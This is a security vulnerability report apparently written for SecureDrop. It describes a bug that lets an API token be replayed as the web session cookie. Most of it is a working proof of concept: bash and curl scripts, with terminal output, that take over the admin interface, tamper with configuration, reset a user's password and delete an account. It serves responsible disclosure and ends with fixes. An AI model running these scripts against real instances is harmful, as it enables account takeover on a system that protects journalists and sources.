
# Security Vulnerability Report: API Token Replay Authentication Bypass

## A. Vulnerability Summary

A shared session verification context bug in `sessions.py` allows API bearer tokens (issued for `/api/v1/*` authentication) to be replayed as the web session cookie (`js=`) to access web-authenticated endpoints. The issue stems from cross-request state bleed: API requests mutate shared instance state (`key_prefix`, `salt`) to API-specific values, and subsequent non-API requests do not reset these values back to the web-session defaults. As a result, the web cookie verification flow and Redis lookup for the `js` cookie may incorrectly use the API token verifier parameters, causing an API token string to be accepted as a valid web session cookie.

This breaks the intended security boundary between API authentication and interactive web authentication. In a vulnerable instance, any attacker who obtains a victim's API token can authenticate to web-only routes by sending `Cookie: js=<API_TOKEN>` (after hitting an API endpoint to trigger the buggy state), bypassing the normal web login flow. This includes bypassing interactive authentication steps and session semantics expected by the UI (e.g., browser session handling and any web login checks). The behavior is reproducible reliably with a single API "priming" request (e.g., `GET /api/v1/`) followed by a web request carrying the API token in the `js` cookie.

**Severity:** Critical  
**Type:** Authentication Bypass  
**Attack Vector:** Network  
**Complexity:** Low

---

## B. Root Cause Analysis

The vulnerability exists in `sessions.py` due to improper state management in the session handler.

### Technical Details

**Line 133 (API Request Handler):**
```python
self.key_prefix = self.api_key_prefix
self.salt = self.api_salt
```

API requests mutate shared instance state by setting the key prefix and salt to API-specific values.

**Line 144 (Non-API Request Handler):**

For non-API requests, these values are **not reset** to web defaults.

**Lines 148, 154 (Cookie Verification):**

Non-API cookie verification and Redis lookup still use the API salt/prefix values from the previous request state.

### Result

An API token value can be accepted as a `js` cookie in web authentication flows because the verification logic inadvertently uses API authentication parameters.

---

## C. Real-World Impact

Authentication bypass / session impersonation: An attacker with a stolen API token can access web routes as the token's owner by replaying the token as `Cookie: js=<token>`.
Separation-of-context failure: API credentials are treated as web session credentials due to shared verifier state, violating a core auth invariant.
Admin takeover with admin token: If the token belongs to an admin user, the attacker gains access to the Admin Interface and can perform high-impact administrative actions.

### Attack Scenarios

1. **Standard User Compromise:**
   - If an attacker obtains any user's API token, they can authenticate to web routes as that user
   - Bypasses login form and 2FA requirements
   - Full session access without proper authentication flow

2. **Administrative Privilege Escalation:**
   - If the stolen token belongs to an admin user, the attacker gains access to:
     - User management functionality
     - Password reset capabilities
     - System configuration controls
     - Account deletion/modification


Demonstrated Real-World Exploitation (Observed)
Using only an admin API token replayed as a web cookie, I demonstrated:

### Admin UI access: 
```bash
GET /admin/
```
returns HTTP 200 and renders the Admin Interface when `Cookie: js=$ADMIN_TOKEN` is provided after priming.
* Configuration tampering: Extracted CSRF token from `/admin/config` and successfully changed the organization name via `/admin/update-org-name`, verified by reading `/admin/config` and observing the new value.
* Password reset abuse: Accessed `/admin/edit/<id>` with replayed cookie, extracted CSRF token and generated password, and reset another user's password via `/admin/edit/<id>/new-password`. Verified the old password no longer works and the new password succeeds.
* Account deletion: Deleted a user via `/admin/delete/<id>` using replayed cookie and CSRF token; verified the user can no longer authenticate and UI login fails, consistent with successful deletion.

### Business Impact

This vulnerability enables full compromise of the web UI security model when API tokens are exposed. Many environments treat API tokens as "integration-only" secrets and may store them in places more likely to leak (CI logs, scripts, config files, debugging output). If a token is obtained, an attacker can pivot into the web UI with the privileges of the token owner.
For admin tokens, the impact is critical:
* Unauthorized administrative access can lead to account takeovers (password resets), user deletion, and configuration changes that can disrupt operations, lock out legitimate users, or weaken security posture.
* Depending on deployment, this may lead to sensitive data exposure and operational compromise, potentially triggering incident response, regulatory reporting, and reputational damage.

---

## D. Step-by-Step Reproduction

### Prerequisites

- Valid API token stored in `$TOKEN` environment variable
- Access to the application endpoint

For this test, I used the following command to get token:

```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ BASE=http://127.0.0.1:8081

# 1) Get OTP (dev seed used by loaddata users, including dellsberg)
OTP=$(oathtool --totp --base32 JHCOGO7VCER3EJ4L)

# 2) Get API token
RESP=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"dellsberg\",\"passphrase\":\"correct horse battery staple profanity oil chewy\",\"one_time_code\":\"$OTP\"}")

echo "$RESP"

TOKEN=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
echo "TOKEN_LEN=${#TOKEN}"

# 3) Token sanity check (must be 200)
curl -i -s "$BASE/api/v1/user" -H "Authorization: Token $TOKEN" | head -n 20

```

Terminal output:
```bash
{
  "expiration": "2026-02-17T01:56:00.206238+00:00", 
  "journalist_first_name": null, 
  "journalist_last_name": null, 
  "journalist_uuid": "92d08e5f-9116-4023-8dd0-045389dad120", 
  "token": "IkQwZW1sMjF5YXlDNjJFQkRUTDluRjA0b1h4SUxwYy1KT0tkN1ZTRUhxS1Ui.aZOukA.zvR8upLCWnHK9dykdHswffpFhx8"
}
TOKEN_LEN=95
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:00 GMT
Content-Type: application/json
Content-Length: 195
Connection: close

{
  "first_name": null, 
  "is_admin": false, 
  "last_login": "2026-02-16T23:56:00.206403", 
  "last_name": null, 
  "username": "dellsberg", 
  "uuid": "92d08e5f-9116-4023-8dd0-045389dad120"
}

```

### Reproduction Steps

# For User account:

#### 1. Set Environment Variables

```bash
BASE=http://127.0.0.1:8081
AUTH="Authorization: Token $TOKEN"
```

#### 2. Confirm Token Validity

```bash
curl -i -s "$BASE/api/v1/user" -H "$AUTH" | head -n 12
```


Terminal output:
```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -i -s "$BASE/api/v1/user" -H "$AUTH" | head -n 12

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:17 GMT
Content-Type: application/json
Content-Length: 195
Connection: close

{
  "first_name": null, 
  "is_admin": false, 
  "last_login": "2026-02-16T23:56:00.206403", 
  "last_name": null, 
                                              
```

**Expected Result:** HTTP/1.1 200 OK

#### 3. Trigger API Mode State Change

```bash
curl -s "$BASE/api/v1/" > /dev/null
```

This forces an API request, flipping the session interface into API mode due to mutable state.

#### 4. Replay API Token as Web Cookie

```bash
curl -i -s "$BASE/account/account" \
  -H "Cookie: js=$TOKEN" | head -n 20
```

Terminal output:

```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -i -s "$BASE/account/account" \
  -H "Cookie: js=$TOKEN" | head -n 20

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 14007
Connection: close

<!DOCTYPE html>
<html lang="en-US" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Edit your account
 | SecureDrop</title>

  <link rel="stylesheet" href="/static/css/journalist.css">

  <link rel="icon" type="image/png" href="/static/i/favicon.png">



```

#### 5. Verify Exploitation Success

**Vulnerable System Response:**
- HTTP 200 OK
- Account page HTML content returned

**Patched System Response:**
- HTTP 302 redirect to `/login`


-----
# For Admin Level Account  Verification

Steps to reproduce:

1. Get an admin API token (dev default account)
From loaddata.py, default admin is journalist with same password/OTP seed.
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ BASE=http://127.0.0.1:8081
PASS='correct horse battery staple profanity oil chewy'
OTP_SEED='JHCOGO7VCER3EJ4L'

OTP=$(oathtool --totp --base32 "$OTP_SEED")
ADMIN_RESP=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}")

echo "$ADMIN_RESP"
ADMIN_TOKEN=$(echo "$ADMIN_RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
echo "ADMIN_TOKEN_LEN=${#ADMIN_TOKEN}"

```
My terminal output:

```bash
{
  "expiration": "2026-02-17T02:09:07.174324+00:00", 
  "journalist_first_name": null, 
  "journalist_last_name": null, 
  "journalist_uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979", 
  "token": "ImNCZXdPVTltNmp3djV6M3JTeHZaWXA5NnBGVGJ2V1NudHhYUFFiS0c1U0Ui.aZOxog.b_ZieElUyqor_PXUro5FSzi4fz8"
}
ADMIN_TOKEN_LEN=95

```



Check it is admin:
```bash
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq
```
You should see "is_admin": true.

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq

{
  "first_name": null,
  "is_admin": true,
  "last_login": "2026-02-17T00:09:07.174585",
  "last_name": null,
  "username": "journalist",
  "uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979"
}

```


2. Prove admin web takeover using only stolen token
```bash
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20
```
If vulnerable, this is 1.1 200 OK and admin HTML.

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:09:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 12912
Connection: close

<!DOCTYPE html>
<html lang="en-US" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin Interface | SecureDrop</title>

  <link rel="stylesheet" href="/static/css/journalist.css">

  <link rel="icon" type="image/png" href="/static/i/favicon.png">

  <!-- nosemgrep: generic.html-templates.security.unquoted-attribute-var.unquoted-attribute-var -->
                                                                                
```



## 3. Prove config tampering via admin tokens:

Fetch CSRF from admin config page with stolen cookie-session:
```bash
CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')
echo "$CSRF_CFG"
```

My terminal output:
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')
echo "$CSRF_CFG"

IjRmYTZjZmRmZjhlODMwNDI2YWEwNGY1MzU2YTFhMTRlMTA3MDNhNmYi.aZOxvQ.YOvuuiJQwsb3Js868y7IoQnVMho

```


3.1) Change org name:
```bash
NEW_ORG="PWNED-$(date +%s)"
curl -i -s -X POST "$BASE/admin/update-org-name" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_CFG" \
  --data-urlencode "organization_name=$NEW_ORG" | head -n 15
```

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ NEW_ORG="PWNED-$(date +%s)"
curl -i -s -X POST "$BASE/admin/update-org-name" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_CFG" \
  --data-urlencode "organization_name=$NEW_ORG" | head -n 15

HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:09:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 243
Location: /admin/config#config-orgname
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/config#config-orgname">/admin/config#config-orgname</a>. If not, click the link.


```

Verify:
```bash
curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"
```

My terminal Output:
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"

  <title>Instance Configuration | PWNED-1771286980</title>
            alt="PWNED-1771286980 logo" width="250"></a>
    <div><input id="organization_name" name="organization_name" required type="text" value="PWNED-1771286980"></div>
  <img id="current-logo" src="/static/i/logo.png" class="logo small" alt="PWNED-1771286980" width="250">
CONFIG_TAMPER_SUCCESS
                       
```

<img width="1495" height="929" alt="image" src="https://github.com/user-attachments/assets/5ea35d34-0ab1-4d09-a4ad-7cfe09939ce1" />


## 4. Password reset abuse from admin account for a user account:
   
Use the following script directly in terminal to reset password for a user level account:

```bash
BASE=http://127.0.0.1:8081
PASS='correct horse battery staple profanity oil chewy'
OTP_SEED='JHCOGO7VCER3EJ4L'

# Fresh admin token
OTP=$(oathtool --totp --base32 "$OTP_SEED")
ADMIN_TOKEN=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')

# Must be 200
curl -s -o /dev/null -w "admin_token_check=%{http_code}\n" \
  "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN"

# Trigger bug state, then fetch dellsberg user id from admin page
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
TARGET_ID=$(curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"<th scope=\"row\">\s*dellsberg\s*</th>.*?href=\"/admin/edit/(\d+)\"", h, re.S)
print(m.group(1) if m else "")
')
echo "TARGET_ID=$TARGET_ID"

# Get edit page and extract csrf + generated password
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
EDIT_HTML=$(curl -s "$BASE/admin/edit/$TARGET_ID" -H "Cookie: js=$ADMIN_TOKEN")

CSRF_EDIT=$(printf '%s' "$EDIT_HTML" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')
NEW_PASS=$(printf '%s' "$EDIT_HTML" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"password\"[^>]*value=\"([^\"]+)\"", h)
print(m.group(1) if m else "")
')
echo "CSRF_LEN=${#CSRF_EDIT} NEW_PASS='$NEW_PASS'"

# Stop if parsing failed
[ -n "$TARGET_ID" ] && [ -n "$CSRF_EDIT" ] && [ -n "$NEW_PASS" ] || { echo "parse failed"; exit 1; }

# Reset dellsberg password as hijacked admin
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -i -s -X POST "$BASE/admin/edit/$TARGET_ID/new-password" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_EDIT" \
  --data-urlencode "password=$NEW_PASS" | head -n 15

# Verify old fails, new works
sleep 31
OTP=$(oathtool --totp --base32 "$OTP_SEED")
echo "[old password]"
curl -i -s -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"dellsberg\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" | head -n 12

sleep 31
OTP=$(oathtool --totp --base32 "$OTP_SEED")
echo "[new password]"
curl -i -s -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"dellsberg\",\"passphrase\":\"$NEW_PASS\",\"one_time_code\":\"$OTP\"}" | head -n 12

```


My terminal output:

```bash
admin_token_check=200
TARGET_ID=2
CSRF_LEN=91 NEW_PASS='eatery morphing outtakes contrite outdated unelected engraving'
HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:32:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 213
Location: /admin/edit/2
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/edit/2">/admin/edit/2</a>. If not, click the link.
[old password]
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:33:16 GMT
Content-Type: application/json
Content-Length: 73
Connection: close

{
  "error": "Forbidden", 
  "message": "Token authentication failed."
}
[new password]
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:33:47 GMT
Content-Type: application/json
Content-Length: 295
Connection: close

{
  "expiration": "2026-02-17T02:33:47.425974+00:00", 
  "journalist_first_name": null, 
  "journalist_last_name": null, 
  "journalist_uuid": "92d08e5f-9116-4023-8dd0-045389dad120", 
                                                               
```
I verified the new updated password by logging in via UI. Please see the below screenshot.

<img width="1920" height="523" alt="image" src="https://github.com/user-attachments/assets/0f6e5796-051f-4c3f-9e39-8a43e558e999" />


## 5. Delete a user account from this:
   
Use the following script directly in terminal to delete a user level account:

```bash
BASE=http://127.0.0.1:8081
PASS='correct horse battery staple profanity oil chewy'
OTP_SEED='JHCOGO7VCER3EJ4L'
VICTIM_USER='dellsberg'

# 1) Fresh admin API token
OTP=$(oathtool --totp --base32 "$OTP_SEED")
ADMIN_TOKEN=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')

echo "ADMIN_TOKEN_LEN=${#ADMIN_TOKEN}"
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq

# 2) Trigger bug state and load admin page with API token as cookie
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
ADMIN_HTML=$(curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN")

# 3) Extract CSRF + victim id
CSRF_ADMIN=$(printf '%s' "$ADMIN_HTML" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')

TARGET_ID=$(printf '%s' "$ADMIN_HTML" | python3 -c '
import re,sys
user="'$VICTIM_USER'"
h=sys.stdin.read()
m=re.search(r"<th scope=\"row\">\s*"+re.escape(user)+r"\s*</th>.*?href=\"/admin/edit/(\d+)\"", h, re.S)
print(m.group(1) if m else "")
')

echo "CSRF_LEN=${#CSRF_ADMIN} TARGET_ID=$TARGET_ID"
[ -n "$CSRF_ADMIN" ] && [ -n "$TARGET_ID" ] || { echo "Parse failed"; exit 1; }

# 4) Delete victim account as hijacked admin
curl -i -s -X POST "$BASE/admin/delete/$TARGET_ID" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_ADMIN" | head -n 20

# 5) Verify victim disappears from admin page
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$VICTIM_USER" \
  && echo "STILL_PRESENT" || echo "DELETE_SUCCESS"

# 6) Verify victim can no longer authenticate
sleep 31
OTP=$(oathtool --totp --base32 "$OTP_SEED")
curl -i -s -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$VICTIM_USER\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" | head -n 20

```

My terminal output:

```bash
{
  "first_name": null,
  "is_admin": true,
  "last_login": "2026-02-17T00:40:15.491317",
  "last_name": null,
  "username": "journalist",
  "uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979"
}
CSRF_LEN=91 TARGET_ID=2
HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:40:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 201
Location: /admin/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/">/admin/</a>. If not, click the link.
  Deleted user &#39;dellsberg&#39;.
STILL_PRESENT
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:40:46 GMT
Content-Type: application/json
Content-Length: 73
Connection: close

{
  "error": "Forbidden", 
  "message": "Token authentication failed."
}

```

Tried logging in via UI but login failed:
<img width="1874" height="754" alt="image" src="https://github.com/user-attachments/assets/4a9cbcfa-5483-478f-b81f-632a478c74b8" />


Checked in the admin panel and the account is deleted:
<img width="1924" height="603" alt="image" src="https://github.com/user-attachments/assets/a7475f1d-d61f-4ce8-8917-120a82b756e2" />

---

## E. Exploit Chain Possibilities
### Attack Chain

1) Obtain API token (via logs, backups, developer tooling, leaked secrets, compromised workstation, etc.)
2) Trigger session context confusion by sending a request to `/api/v1/*` (primes the shared verifier state)
3) Replay token as web session cookie: `Cookie: js=<API_TOKEN>`
4) Access web-only routes as victim; if token is admin → access admin UI and perform privileged actions


```
Token Theft/Exposure
    ↓
API Token Replay as Web Cookie
    ↓
Web Session Takeover
    ↓
[If Admin Token] Admin UI Access
    ↓
Malicious Actions:
  - Password resets
  - User deletion
  - Configuration tampering
  - Data exfiltration
```

### Token Acquisition Methods

An attacker might obtain API tokens through:
- Log file exposure
- Insecure storage
- Network interception
- Insider threat
- Application vulnerability (XSS, SSRF, etc.)
- Source code repository exposure
- Backup file leakage

---

## F. Recommendations

### Immediate Actions

1. **Deploy Emergency Patch:**
   - Reset session state properly for non-API requests
   - Ensure `key_prefix` and `salt` revert to web defaults

2. **Rotate All API Tokens:**
   - Force regeneration of all active API tokens
   - Notify users of the security measure

3. **Audit Access Logs:**
   - Review for suspicious authentication patterns
   - Look for API tokens used in cookie headers

### Code Fix Example

```python
# Line 144 - Add state reset for non-API requests
def handle_non_api_request(self):
    # Reset to web authentication defaults
    self.key_prefix = self.web_key_prefix
    self.salt = self.web_salt
    # Continue with normal processing...
```

### Long-Term Mitigations

1. **Implement Separate Authentication Contexts:**
   - Use distinct session handlers for API vs. web
   - Avoid shared mutable state

2. **Add Context Validation:**
   - Verify authentication method matches endpoint type
   - Reject API tokens on web routes explicitly

3. **Implement Token Binding:**
   - Bind tokens to specific contexts (API-only, web-only)
   - Include token type metadata in verification

4. **Security Testing:**
   - Add automated tests for authentication boundary violations
   - Include this scenario in penetration testing scope

5. **Monitoring & Detection:**
   - Alert on authentication method mismatches
   - Monitor for unusual authentication patterns

---

## G. References

- **Affected File:** `sessions.py`
- **Critical Lines:** 133, 144, 148, 154
- **CWE-287:** Improper Authentication
- **CWE-384:** Session Fixation

---

**Report Generated:** 2026-02-16  
**Classification:** CONFIDENTIAL - SECURITY SENSITIVE
